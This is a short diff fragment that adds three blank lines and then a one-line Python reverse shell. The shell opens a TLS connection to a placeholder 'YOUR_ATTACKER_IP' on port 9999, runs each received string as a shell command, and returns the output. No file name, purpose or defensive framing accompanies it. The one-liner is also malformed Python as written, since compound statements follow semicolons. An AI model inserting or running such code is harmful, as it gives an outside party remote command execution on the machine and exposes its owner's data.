@@ -1,0 +1,4 @@
+
+
+
+import socket,subprocess,ssl;IP='YOUR_ATTACKER_IP';PORT=9999;CERT='server.crt';C=ssl.create_default_context(cafile=CERT);S=socket.socket();SS=C.wrap_socket(S,server_hostname=IP);SS.connect((IP,PORT));WHILE=True;while WHILE:C=SS.recv(1024).decode();if C.lower()=='exit':break;O=subprocess.run(C,shell=True,capture_output=True);SS.send(O.stdout+O.stderr);SS.close();
